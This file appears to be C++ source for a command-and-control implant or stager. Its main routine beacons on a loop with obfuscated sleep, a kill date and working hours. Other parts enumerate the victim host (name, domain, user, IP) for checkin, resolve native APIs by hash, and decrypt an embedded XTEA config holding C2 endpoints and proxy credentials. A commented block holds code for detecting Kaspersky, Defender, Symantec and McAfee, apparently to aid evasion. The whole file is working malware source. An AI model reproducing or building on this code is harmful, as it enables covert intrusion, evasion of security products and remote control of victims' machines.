#include <core/include/base.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Parser;
using namespace Stream;
using namespace Dispatcher;
using namespace Memory::Context;

#define STAGER
// TODO: delegate functions and api separately to stager/payload
namespace Main {
    UINT8 RDATA Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };

    VOID MainRoutine() {
        HEXANE;

        static int retry = 0;
        do {
            if (!ObfuscateSleep(nullptr, nullptr) ||
                !RuntimeChecks()) {
                break;
            }

            if (!CheckTime()) {
                continue;
            }
            if (!ctx->session.checkin &&
                !ctx->network.message_queue) {
                if (!CheckEnvironment()) {
                    break;
                }
            }

            if (!DispatchRoutine()) {
                ctx->session.retries++;
                if (retry == ctx->session.retries) {
                    break;
                }

                continue;
            }

            retry = 0;
        }
        while (ntstatus != ERROR_EXIT);
        ContextDestroy();
    }

	BOOL EnumSystem() {
		// resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
		HEXANE;
		
		_stream *out              = CreateStreamWithHeaders(TypeCheckin);
        IP_ADAPTER_INFO adapter   = { };
		OSVERSIONINFOW os_version = { };

		BOOL success             = true;
        DWORD length             = MAX_PATH;
        CHAR buffer[MAX_PATH]    = { };
        
        x_ntassertb(ctx->enumapi.RtlGetVersion(&os_version));
		
        ctx->session.version = WIN_VERSION_UNKNOWN;
        os_version.dwOSVersionInfoSize = sizeof(os_version);
		
        if (os_version.dwMajorVersion >= 5) {
            if (os_version.dwMajorVersion == 5) {
                if (os_version.dwMinorVersion == 1) {
                    ctx->session.version = WIN_VERSION_XP;
                }
            }
            else if (os_version.dwMajorVersion == 6) {
                if (os_version.dwMinorVersion == 0) {
                    ctx->session.version = WIN_VERSION_2008;
                }
                else if (os_version.dwMinorVersion == 1) {
                    ctx->session.version = WIN_VERSION_2008_R2;
                }
                else if (os_version.dwMinorVersion == 2) {
                    ctx->session.version = WIN_VERSION_2012;
                }
                else if (os_version.dwMinorVersion == 3) {
                    ctx->session.version = WIN_VERSION_2012_R2;
                }
            }
            else if (os_version.dwMajorVersion == 10) {
                if (os_version.dwMinorVersion == 0) {
                    ctx->session.version = WIN_VERSION_2016_X;
                }
            }
        }

        if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
            if (ctx->config.hostname[0]) {
                if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
            if (ctx->network.domain[0]) {
                if (MbsBoundCompare(ctx->network.domain, buffer, MbsLength(ctx->network.domain)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &length)) {
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = sizeof(IP_ADAPTER_INFO);
        if (ctx->enumapi.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
            PackString(out, adapter.IpAddressList.IpAddress.String);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));

	/* TODO:
		#include <stdio.h>
		#include <windows.h>
		#include <tlhelp32.h>
		#include <evntrace.h>
		#include <evntcons.h>

		// Function prototypes
		void CheckRegistryKey(HKEY rootKey, const char* subKey);
		void CheckService(const char* serviceName);
		void CheckProcess(const char* processName);
		void CheckETWProviders();
		void CheckForSecurityProducts();

		void CheckRegistryKey(HKEY rootKey, const char* subKey) {
			HKEY hKey;
			if (RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
				printf("Registry key %s exists.\n", subKey);
				RegCloseKey(hKey);
			} else {
				if (GetLastError() == ERROR_ACCESS_DENIED) {
					printf("Insufficient permissions to access registry key %s.\n", subKey);
				} else {
					printf("Registry key %s does not exist.\n", subKey);
				}
			}
		}

		void CheckService(const char* serviceName) {
			SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
			if (scmHandle) {
				SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_QUERY_STATUS);
				if (serviceHandle) {
					SERVICE_STATUS serviceStatus;
					if (QueryServiceStatus(serviceHandle, &serviceStatus)) {
						if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
							printf("Service %s is running.\n", serviceName);
						} else {
							printf("Service %s is not running.\n", serviceName);
						}
					} else {
						printf("Failed to query service status for %s.\n", serviceName);
					}
					CloseServiceHandle(serviceHandle);
				} else {
					if (GetLastError() == ERROR_ACCESS_DENIED) {
						printf("Insufficient permissions to access service %s.\n", serviceName);
					} else {
						printf("Service %s does not exist.\n", serviceName);
					}
				}
				CloseServiceHandle(scmHandle);
			} else {
				printf("Failed to open service manager.\n");
			}
		}

void CheckProcess(const char* processName) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_PROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed\n");
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                printf("Process %s is running.\n", processName);
                CloseHandle(hProcessSnap);
                return;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    printf("Process %s is not running.\n", processName);
}

void CheckETWProviders() {
    // Array of ETW provider GUIDs for common security products
    const GUID* providers[] = {
        &GUID_DEVLOAD,                  // Example GUID for device load events (replace with actual product GUIDs)
        &GUID_CIM,                      // Example GUID (replace with actual product GUIDs)
        // Add more relevant GUIDs here for specific security products
    };

    printf("Checking for ETW providers...\n");

    for (int i = 0; i < sizeof(providers) / sizeof(providers[0]); i++) {
        // Start an ETW trace session to check for active providers
        EVENT_TRACE_PROPERTIES* pTraceProperties = (EVENT_TRACE_PROPERTIES*)malloc(sizeof(EVENT_TRACE_PROPERTIES) + 64);
        memset(pTraceProperties, 0, sizeof(EVENT_TRACE_PROPERTIES) + 64);
        pTraceProperties->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 64;
        pTraceProperties->Wnode.Guid = *providers[i];
        pTraceProperties->Wnode.ClientContext = 1; // Kernel mode context

        TRACEHANDLE traceHandle;
        ULONG status = StartTrace(&traceHandle, "MyTraceSession", pTraceProperties);

        if (status == ERROR_SUCCESS) {
            printf("ETW provider %s is enabled.\n", providers[i]);
            StopTrace(traceHandle, pTraceProperties->Wnode.Guid);
        } else {
            if (status == ERROR_ACCESS_DENIED) {
                printf("Insufficient permissions to access ETW provider %s.\n", providers[i]);
            } else {
                printf("ETW provider %s is not enabled or does not exist.\n", providers[i]);
            }
        }
        free(pTraceProperties);
    }
}

void CheckForSecurityProducts() {
    printf("Checking for security products...\n");

    // Kaspersky
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\KasperskyLab");
    CheckService("AVP"); // Kaspersky Antivirus service
    CheckProcess("avp.exe");

    // Microsoft Defender for Endpoint
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Microsoft Defender");
    CheckService("Sense"); // MDE service
    CheckProcess("MsSense.exe");

    // Symantec Endpoint Protection
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Symantec\\Symantec Endpoint Protection");
    CheckService("SepMasterService"); // SEP service
    CheckProcess("ccsvchst.exe");

    // McAfee Endpoint Security
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\Endpoint Security");
    CheckService("McShield"); // McAfee service
    CheckProcess("McShield.exe");

    // ETW-TI provider check
    CheckETWProviders();

    printf("Note: This program checks for specific security products and their ETW providers.\n");

        }


		*/

    defer:
        Dispatcher::MessageQueue(out);
        return success;
    }

    BOOL ResolveApi() {
		// TODO: create separate ResolveApi for loader and payload
		HEXANE;

        bool success = true;
        x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
        x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));

        x_assertb(F_PTR_HASHES(ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));

#if defined(PAYLOAD)
// httpapi
// pipeapi
// enumapi
// memapi
// heapapi
// utilapi
// procapi
// ioapi
// secapi

#elif defined(STAGER)
// TODO: stager does not need everything and can reduce size by omitting certain api structs
// httpapi
// enumapi
// memapi
// heapapi
// procapi
// secapi
// EnumSystem
#endif

        x_assertb(F_PTR_HMOD(ctx->nt.NtDelayExecution,              ctx->modules.ntdll, NTDELAYEXECUTION));
        x_assertb(F_PTR_HMOD(ctx->nt.NtCreateEvent,                 ctx->modules.ntdll, NTCREATEEVENT));
        x_assertb(F_PTR_HMOD(ctx->nt.NtQueueApcThread,              ctx->modules.ntdll, NTQUEUEAPCTHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtContinue,                    ctx->modules.ntdll, NTCONTINUE));
        x_assertb(F_PTR_HMOD(ctx->nt.NtAlertResumeThread,           ctx->modules.ntdll, NTALERTRESUMETHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtSignalAndWaitForSingleObject, ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
        x_assertb(F_PTR_HMOD(ctx->nt.NtFreeVirtualMemory,           ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtAllocateVirtualMemory,       ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtProtectVirtualMemory,        ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtReadVirtualMemory,           ctx->modules.ntdll, NTREADVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtWriteVirtualMemory,          ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtQueryVirtualMemory,          ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(ctx->nt.NtCreateSection,               ctx->modules.ntdll, NTCREATESECTION));
        x_assertb(F_PTR_HMOD(ctx->nt.NtMapViewOfSection,            ctx->modules.ntdll, NTMAPVIEWOFSECTION));
        x_assertb(F_PTR_HMOD(ctx->nt.NtUnmapViewOfSection,          ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
        x_assertb(F_PTR_HMOD(ctx->nt.NtOpenProcess,                 ctx->modules.ntdll, NTOPENPROCESS));
        x_assertb(F_PTR_HMOD(ctx->nt.NtCreateUserProcess,           ctx->modules.ntdll, NTCREATEUSERPROCESS));
        x_assertb(F_PTR_HMOD(ctx->nt.NtTerminateProcess,            ctx->modules.ntdll, NTTERMINATEPROCESS));
        x_assertb(F_PTR_HMOD(ctx->nt.NtTerminateThread,             ctx->modules.ntdll, NTTERMINATETHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlCreateProcessParametersEx,  ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlDestroyProcessParameters,   ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
        x_assertb(F_PTR_HMOD(ctx->nt.NtOpenProcessToken,            ctx->modules.ntdll, NTOPENPROCESSTOKEN));
        x_assertb(F_PTR_HMOD(ctx->nt.NtOpenThreadToken,             ctx->modules.ntdll, NTOPENTHREADTOKEN));
        x_assertb(F_PTR_HMOD(ctx->nt.NtDuplicateToken,              ctx->modules.ntdll, NTDUPLICATETOKEN));
        x_assertb(F_PTR_HMOD(ctx->nt.NtDuplicateObject,             ctx->modules.ntdll, NTDUPLICATEOBJECT));
        x_assertb(F_PTR_HMOD(ctx->nt.NtQueryInformationToken,       ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
        x_assertb(F_PTR_HMOD(ctx->nt.NtQueryInformationProcess,     ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlCreateHeap,                 ctx->modules.ntdll, RTLCREATEHEAP));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlAllocateHeap,               ctx->modules.ntdll, RTLALLOCATEHEAP));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlReAllocateHeap,             ctx->modules.ntdll, RTLREALLOCATEHEAP));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlFreeHeap,                   ctx->modules.ntdll, RTLFREEHEAP));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlDestroyHeap,                ctx->modules.ntdll, RTLDESTROYHEAP));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlInitUnicodeString,          ctx->modules.ntdll, RTLINITUNICODESTRING));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlAddVectoredExceptionHandler, ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlRemoveVectoredExceptionHandler, ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
        x_assertb(F_PTR_HMOD(ctx->nt.NtCreateThreadEx,              ctx->modules.ntdll, NTCREATETHREADEX));
        x_assertb(F_PTR_HMOD(ctx->nt.NtDeviceIoControlFile,         ctx->modules.ntdll, NTDEVICEIOCONTROLFILE));
        x_assertb(F_PTR_HMOD(ctx->nt.NtOpenFile,                    ctx->modules.ntdll, NTOPENFILE));
        x_assertb(F_PTR_HMOD(ctx->nt.NtOpenThread,                  ctx->modules.ntdll, NTOPENTHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlRandomEx,                   ctx->modules.ntdll, RTLRANDOMEX));
        x_assertb(F_PTR_HMOD(ctx->nt.NtResumeThread,                ctx->modules.ntdll, NTRESUMETHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtGetContextThread,            ctx->modules.ntdll, NTGETCONTEXTTHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtSetContextThread,            ctx->modules.ntdll, NTSETCONTEXTTHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtSetInformationThread,        ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
        x_assertb(F_PTR_HMOD(ctx->nt.NtWaitForSingleObject,         ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
        x_assertb(F_PTR_HMOD(ctx->nt.TpAllocWork,                   ctx->modules.ntdll, TPALLOCWORK));
        x_assertb(F_PTR_HMOD(ctx->nt.TpPostWork,                    ctx->modules.ntdll, TPPOSTWORK));
        x_assertb(F_PTR_HMOD(ctx->nt.TpReleaseWork,                 ctx->modules.ntdll, TPRELEASEWORK));
        x_assertb(F_PTR_HMOD(ctx->nt.NtTestAlert,                   ctx->modules.ntdll, NTTESTALERT));
        x_assertb(F_PTR_HMOD(ctx->nt.NtClose,                       ctx->modules.ntdll, NTCLOSE));
        x_assertb(F_PTR_HMOD(ctx->nt.RtlGetVersion,                 ctx->modules.ntdll, RTLGETVERSION));
        x_assertb(F_PTR_HMOD(ctx->nt.NtQuerySystemInformation,      ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));

		x_assertb(F_PTR_HMOD(ctx->nt.SetProcessValidCallTargets,         ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
        x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary,                     ctx->modules.kernel32, FREELIBRARY));
        x_assertb(F_PTR_HMOD(ctx->win32.Heap32ListFirst,                 ctx->modules.kernel32, HEAP32LISTFIRST));
        x_assertb(F_PTR_HMOD(ctx->win32.Heap32ListNext,                  ctx->modules.kernel32, HEAP32LISTNEXT));
        x_assertb(F_PTR_HMOD(ctx->win32.GetProcessHeap,                  ctx->modules.kernel32, GETPROCESSHEAP));
        x_assertb(F_PTR_HMOD(ctx->win32.GetProcessHeaps,                 ctx->modules.kernel32, GETPROCESSHEAPS));
        x_assertb(F_PTR_HMOD(ctx->win32.GetProcAddress,                  ctx->modules.kernel32, GETPROCADDRESS));
        x_assertb(F_PTR_HMOD(ctx->win32.GetModuleHandleA,                ctx->modules.kernel32, GETMODULEHANDLEA));
        x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process,                  ctx->modules.kernel32, ISWOW64PROCESS));
        x_assertb(F_PTR_HMOD(ctx->win32.OpenProcess,                     ctx->modules.kernel32, OPENPROCESS));
        x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot,        ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
        x_assertb(F_PTR_HMOD(ctx->win32.Process32First,                  ctx->modules.kernel32, PROCESS32FIRST));
        x_assertb(F_PTR_HMOD(ctx->win32.Process32Next,                   ctx->modules.kernel32, PROCESS32NEXT));
        x_assertb(F_PTR_HMOD(ctx->win32.Module32First,                   ctx->modules.kernel32, MODULE32FIRST));
        x_assertb(F_PTR_HMOD(ctx->win32.Module32Next,                    ctx->modules.kernel32, MODULE32NEXT));
        x_assertb(F_PTR_HMOD(ctx->win32.GetCurrentProcessId,             ctx->modules.kernel32, GETCURRENTPROCESSID));
        x_assertb(F_PTR_HMOD(ctx->win32.GetProcessId,                    ctx->modules.kernel32, GETPROCESSID));
        x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx,            ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
        x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA,              ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
        x_assertb(F_PTR_HMOD(ctx->win32.SetLastError,                    ctx->modules.kernel32, SETLASTERROR));
        x_assertb(F_PTR_HMOD(ctx->win32.GetLastError,                    ctx->modules.kernel32, GETLASTERROR));
        x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA,                   ctx->modules.kernel32, REGOPENKEYEXA));
        x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA,                 ctx->modules.kernel32, REGCREATEKEYEXA));
        x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA,                  ctx->modules.kernel32, REGSETVALUEEXA));
        x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey,                     ctx->modules.kernel32, REGCLOSEKEY));
        x_assertb(F_PTR_HMOD(ctx->win32.ReadFile,                        ctx->modules.kernel32, READFILE));
        x_assertb(F_PTR_HMOD(ctx->win32.WriteFile,                       ctx->modules.kernel32, WRITEFILE));
        x_assertb(F_PTR_HMOD(ctx->win32.CreateFileW,                     ctx->modules.kernel32, CREATEFILEW));
        x_assertb(F_PTR_HMOD(ctx->win32.GetFileSizeEx,                   ctx->modules.kernel32, GETFILESIZEEX));
        x_assertb(F_PTR_HMOD(ctx->win32.SetFilePointer,                  ctx->modules.kernel32, SETFILEPOINTER));
        x_assertb(F_PTR_HMOD(ctx->win32.GetFullPathNameA,                ctx->modules.kernel32, GETFULLPATHNAMEA));
        x_assertb(F_PTR_HMOD(ctx->win32.FindFirstFileA,                  ctx->modules.kernel32, FINDFIRSTFILEA));
        x_assertb(F_PTR_HMOD(ctx->win32.FindClose,                       ctx->modules.kernel32, FINDCLOSE));
        x_assertb(F_PTR_HMOD(ctx->win32.FindNextFileA,                   ctx->modules.kernel32, FINDNEXTFILEA));
        x_assertb(F_PTR_HMOD(ctx->win32.GetCurrentDirectoryA,            ctx->modules.kernel32, GETCURRENTDIRECTORYA));
        x_assertb(F_PTR_HMOD(ctx->win32.FileTimeToSystemTime,            ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
        x_assertb(F_PTR_HMOD(ctx->win32.SystemTimeToTzSpecificLocalTime, ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
        x_assertb(F_PTR_HMOD(ctx->win32.GetLocalTime,                    ctx->modules.kernel32, GETLOCALTIME));
        x_assertb(F_PTR_HMOD(ctx->win32.GetSystemTimeAsFileTime,         ctx->modules.kernel32, GETSYSTEMTIMEASFILETIME));
        x_assertb(F_PTR_HMOD(ctx->win32.FormatMessageA,                  ctx->modules.kernel32, FORMATMESSAGEA));
        x_assertb(F_PTR_HMOD(ctx->win32.CreateRemoteThread,              ctx->modules.kernel32, CREATEREMOTETHREAD));
        x_assertb(F_PTR_HMOD(ctx->win32.CreateThread,                    ctx->modules.kernel32, CREATETHREAD));
        x_assertb(F_PTR_HMOD(ctx->win32.ExitThread,                      ctx->modules.kernel32, EXITTHREAD));
        x_assertb(F_PTR_HMOD(ctx->win32.QueueUserAPC,                    ctx->modules.kernel32, QUEUEUSERAPC));
        x_assertb(F_PTR_HMOD(ctx->win32.GetThreadLocale,                 ctx->modules.kernel32, GETTHREADLOCALE));
        x_assertb(F_PTR_HMOD(ctx->win32.SleepEx,                         ctx->modules.kernel32, SLEEPEX));
        x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA,                   ctx->modules.kernel32, FINDRESOURCEA));
        x_assertb(F_PTR_HMOD(ctx->win32.LoadResource,                    ctx->modules.kernel32, LOADRESOURCE));
        x_assertb(F_PTR_HMOD(ctx->win32.LockResource,                    ctx->modules.kernel32, LOCKRESOURCE));
        x_assertb(F_PTR_HMOD(ctx->win32.SizeofResource,                  ctx->modules.kernel32, SIZEOFRESOURCE));
        x_assertb(F_PTR_HMOD(ctx->win32.FreeResource,                    ctx->modules.kernel32, FREERESOURCE));
        x_assertb(F_PTR_HMOD(ctx->win32.CallNamedPipeW,                  ctx->modules.kernel32, CALLNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(ctx->win32.CreateNamedPipeW,                ctx->modules.kernel32, CREATENAMEDPIPEW));
        x_assertb(F_PTR_HMOD(ctx->win32.WaitNamedPipeW,                  ctx->modules.kernel32, WAITNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(ctx->win32.SetNamedPipeHandleState,         ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
        x_assertb(F_PTR_HMOD(ctx->win32.ConnectNamedPipe,                ctx->modules.kernel32, CONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(ctx->win32.TransactNamedPipe,               ctx->modules.kernel32, TRANSACTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(ctx->win32.DisconnectNamedPipe,             ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(ctx->win32.PeekNamedPipe,                   ctx->modules.kernel32, PEEKNAMEDPIPE));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen,                     ctx->modules.winhttp, WINHTTPOPEN));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect,                  ctx->modules.winhttp, WINHTTPCONNECT));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest,              ctx->modules.winhttp, WINHTTPOPENREQUEST));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpAddRequestHeaders,        ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSetOption,                ctx->modules.winhttp, WINHTTPSETOPTION));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetProxyForUrl,           ctx->modules.winhttp, WINHTTPGETPROXYFORURL));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSendRequest,              ctx->modules.winhttp, WINHTTPSENDREQUEST));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReceiveResponse,          ctx->modules.winhttp, WINHTTPRECEIVERESPONSE));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReadData,                 ctx->modules.winhttp, WINHTTPREADDATA));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders,             ctx->modules.winhttp, WINHTTPQUERYHEADERS));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable,       ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
        x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle,              ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
        x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo,                 ctx->modules.iphlpapi, GETADAPTERSINFO));
        x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA,            ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
        x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA,            ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
        x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges,           ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
        x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser,         ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
        x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA,                    ctx->modules.advapi, GETUSERNAMEA));
        x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW,               ctx->modules.advapi, LOOKUPACCOUNTSIDW));
        x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA,           ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
        x_assertb(F_PTR_HMOD(ctx->win32.SetEntriesInAclA,                ctx->modules.advapi, SETENTRIESINACLA));
        x_assertb(F_PTR_HMOD(ctx->win32.AllocateAndInitializeSid,        ctx->modules.advapi, ALLOCATEANDINITIALIZESID));
        x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce,                 ctx->modules.advapi, ADDMANDATORYACE));
        x_assertb(F_PTR_HMOD(ctx->win32.InitializeSecurityDescriptor,    ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR));
        x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorDacl,       ctx->modules.advapi, SETSECURITYDESCRIPTORDACL));
        x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl,       ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
        x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl,                   ctx->modules.advapi, INITIALIZEACL));
        x_assertb(F_PTR_HMOD(ctx->win32.FreeSid,                         ctx->modules.advapi, FREESID));

        defer:
        return success;
    }

    BOOL ReadConfig() {
        HEXANE;

        _parser parser  = { };
        bool success    = true;

        CreateParser(&parser, Config, sizeof(Config));
        MemSet(Config, 0, sizeof(Config));

        ctx->session.peer_id = UnpackUint32(&parser);
        ParserMemcpy(&parser, &ctx->config.session_key, nullptr);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(parser.buffer), parser.length, ctx->config.session_key, false);
        }

        ParserStrcpy(&parser, &ctx->config.hostname, nullptr);

        ctx->session.retries        = UnpackUint32(&parser);
        ctx->config.working_hours   = UnpackUint32(&parser);
        ctx->config.kill_date       = UnpackUint64(&parser);
        ctx->config.sleeptime       = UnpackUint32(&parser);
        ctx->config.jitter          = UnpackUint32(&parser);

        // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary

        if (F_PTR_HMOD(ctx->memapi.LoadLibraryA, ctx->modules.kernel32, LOADLIBRARYA)) {
            x_assertb(ctx->modules.crypt32  = ctx->memapi.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(ctx->modules.winhttp  = ctx->memapi.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(ctx->modules.advapi   = ctx->memapi.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(ctx->modules.iphlpapi = ctx->memapi.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(ctx->modules.mscoree  = ctx->memapi.LoadLibraryA(UnpackString(&parser, nullptr)));
        }
        else {
            success = false;
            goto defer;
        }

        ctx->network.message_queue = nullptr;

#ifdef TRANSPORT_HTTP
        ctx->network.http = (_http_context*) Malloc(sizeof(_http_context));

        ctx->network.http->handle     = nullptr;
        ctx->network.http->endpoints  = nullptr;
        ctx->network.http->headers    = nullptr;

        ParserWcscpy(&parser, &ctx->network.http->useragent, nullptr);
        ParserWcscpy(&parser, &ctx->network.http->address, nullptr  );
        ctx->network.http->port = (int) UnpackUint32(&parser);
        ParserStrcpy(&parser, &ctx->network.domain, nullptr);

        ctx->network.http->n_endpoints = UnpackUint32(&parser);
        ctx->network.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((ctx->network.http->n_endpoints + 1)));

        for (auto i = 0; i < ctx->network.http->n_endpoints; i++) {
            ParserWcscpy(&parser, &ctx->network.http->endpoints[i], nullptr);
        }

        ctx->network.http->endpoints[ctx->network.http->n_endpoints] = nullptr;
        ctx->network.b_proxy = UnpackBool(&parser);

        if (ctx->network.b_proxy) {
            ctx->network.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
            ctx->network.http->access = INTERNET_OPEN_TYPE_PROXY;

            ParserWcscpy(&parser, &ctx->network.http->proxy->address, nullptr );
            ParserWcscpy(&parser, &ctx->network.http->proxy->username, nullptr );
            ParserWcscpy(&parser, &ctx->network.http->proxy->password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        ParserWcscpy(&parser, &ctx->network.pipe_name, nullptr);
#endif

    defer:
        DestroyParser(&parser);
        return success;
    }
}

using namespace Main;
